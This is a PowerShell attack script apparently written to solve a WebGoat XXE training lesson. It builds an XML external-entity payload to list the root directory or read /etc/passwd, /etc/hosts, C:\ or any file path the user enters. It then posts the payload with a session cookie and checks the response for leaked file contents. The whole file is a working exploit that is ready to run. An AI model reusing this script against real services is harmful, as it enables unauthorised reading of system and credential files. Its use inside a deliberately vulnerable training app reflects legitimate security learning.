# XXE (XML External Entity) Attack Script
# Challenge: List root directory via XXE injection

param(
    [string]$WebGoatUrl = "http://192.168.254.112:8001",
    [string]$Target = "root",  # "root", "passwd", "hosts", etc.
    [switch]$Help
)

if ($Help) {
    Write-Host @"
====================================================================
XXE ATTACK SCRIPT - USAGE
====================================================================

Usage: .\xxe_attack.ps1 [-Target <target>] [-WebGoatUrl <url>]

Targets:
  root      - List root directory (/) [DEFAULT]
  passwd    - Read /etc/passwd
  hosts     - Read /etc/hosts
  win       - List C:\ (Windows)
  custom    - Will prompt for custom file path

Examples:
  .\xxe_attack.ps1                          # List root directory
  .\xxe_attack.ps1 -Target passwd           # Read /etc/passwd
  .\xxe_attack.ps1 -Target custom           # Custom file path

====================================================================
"@
    exit
}

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "  XXE (XML External Entity) ATTACK" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

# Define payloads
$payloads = @{
    "root" = @{
        "file" = "file:///"
        "description" = "List root directory"
    }
    "passwd" = @{
        "file" = "file:///etc/passwd"
        "description" = "Read /etc/passwd"
    }
    "hosts" = @{
        "file" = "file:///etc/hosts"
        "description" = "Read /etc/hosts"
    }
    "win" = @{
        "file" = "file:///c:/"
        "description" = "List C:\ drive"
    }
}

# Get target payload
if ($Target -eq "custom") {
    $customPath = Read-Host "Enter file path (e.g., /etc/passwd or file:///etc/passwd)"
    if (-not $customPath.StartsWith("file://")) {
        $customPath = "file://" + $customPath
    }
    $filePath = $customPath
    $description = "Custom: $customPath"
} else {
    if (-not $payloads.ContainsKey($Target)) {
        Write-Host "Error: Unknown target '$Target'" -ForegroundColor Red
        Write-Host "Available targets: root, passwd, hosts, win, custom" -ForegroundColor Yellow
        exit 1
    }
    $filePath = $payloads[$Target]["file"]
    $description = $payloads[$Target]["description"]
}

Write-Host "Target: $description" -ForegroundColor Green
Write-Host "File: $filePath" -ForegroundColor Green
Write-Host ""

# Construct XXE payload
$xxePayload = @"
<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "$filePath">
]>
<comment>
  <text>&xxe;</text>
</comment>
"@

Write-Host "XXE Payload:" -ForegroundColor Yellow
Write-Host $xxePayload -ForegroundColor Gray
Write-Host ""

# Prompt for session ID
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "STEP 1: Get Your Session Cookie" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. Open WebGoat at: $WebGoatUrl" -ForegroundColor White
Write-Host "2. Log in and navigate to the XXE lesson" -ForegroundColor White
Write-Host "3. Open DevTools (F12) → Application → Cookies" -ForegroundColor White
Write-Host "4. Copy the JSESSIONID cookie value" -ForegroundColor White
Write-Host ""

$sessionId = Read-Host "Enter your JSESSIONID"

if ([string]::IsNullOrWhiteSpace($sessionId)) {
    Write-Host "Error: Session ID is required!" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "STEP 2: Finding XXE Endpoint" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Common XXE endpoints to try:" -ForegroundColor Yellow
$endpoints = @(
    "/WebGoat/xxe/simple",
    "/WebGoat/xxe/comments",
    "/WebGoat/XXE/simple",
    "/WebGoat/xxe/attack"
)

foreach ($ep in $endpoints) {
    Write-Host "  - $WebGoatUrl$ep" -ForegroundColor Gray
}
Write-Host ""

# Prompt for endpoint
Write-Host "Check the Network tab in DevTools to find the correct endpoint." -ForegroundColor Yellow
Write-Host "Look for the POST request when you submit a comment." -ForegroundColor Yellow
Write-Host ""
$endpoint = Read-Host "Enter the XXE endpoint path (e.g., /WebGoat/xxe/simple)"

if ([string]::IsNullOrWhiteSpace($endpoint)) {
    Write-Host "Using default: /WebGoat/xxe/simple" -ForegroundColor Yellow
    $endpoint = "/WebGoat/xxe/simple"
}

$fullUrl = "$WebGoatUrl$endpoint"

Write-Host ""
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "STEP 3: Executing XXE Attack" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

# Prepare headers
$headers = @{
    "Content-Type" = "application/xml"
    "Cookie" = "JSESSIONID=$sessionId"
    "Accept" = "*/*"
}

Write-Host "Sending XXE payload to: $fullUrl" -ForegroundColor Yellow
Write-Host ""

try {
    # Send the request
    $response = Invoke-WebRequest -Uri $fullUrl -Method POST -Body $xxePayload -Headers $headers -UseBasicParsing
    
    Write-Host "=====================================================================" -ForegroundColor Green
    Write-Host "SUCCESS! Response received:" -ForegroundColor Green
    Write-Host "=====================================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host ""
    Write-Host "Response Body:" -ForegroundColor Yellow
    Write-Host $response.Content -ForegroundColor White
    Write-Host ""
    
    # Check if it looks like a directory listing or file content
    if ($response.Content -match "(bin|etc|usr|var|root|home|dev|proc)" -or
        $response.Content -match "root:.*:0:0" -or
        $response.Content -match "localhost" -or
        $response.Content -match "<") {
        Write-Host "✅ XXE attack appears successful!" -ForegroundColor Green
        Write-Host "   File/directory content was retrieved!" -ForegroundColor Green
    } else {
        Write-Host "⚠️  Response received but may not contain expected data." -ForegroundColor Yellow
        Write-Host "   Check the response above." -ForegroundColor Yellow
    }
    
} catch {
    Write-Host "=====================================================================" -ForegroundColor Red
    Write-Host "ERROR" -ForegroundColor Red
    Write-Host "=====================================================================" -ForegroundColor Red
    Write-Host ""
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host ""
    
    if ($_.Exception.Response) {
        Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
        try {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $responseBody = $reader.ReadToEnd()
            Write-Host "Response Body:" -ForegroundColor Yellow
            Write-Host $responseBody -ForegroundColor White
        } catch {
            Write-Host "Could not read response body" -ForegroundColor Red
        }
    }
    
    Write-Host ""
    Write-Host "Troubleshooting:" -ForegroundColor Yellow
    Write-Host "1. Verify your JSESSIONID is correct (not expired)" -ForegroundColor White
    Write-Host "2. Check the endpoint path is correct" -ForegroundColor White
    Write-Host "3. Make sure you're on the XXE lesson page" -ForegroundColor White
    Write-Host "4. Try submitting a normal comment first to find the endpoint" -ForegroundColor White
}

Write-Host ""
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Next Steps:" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "1. Check WebGoat to see if the lesson is marked complete" -ForegroundColor White
Write-Host "2. If not, try different payloads with: .\xxe_attack.ps1 -Target passwd" -ForegroundColor White
Write-Host "3. Check xxe_guide.txt for more payload examples" -ForegroundColor White
Write-Host ""
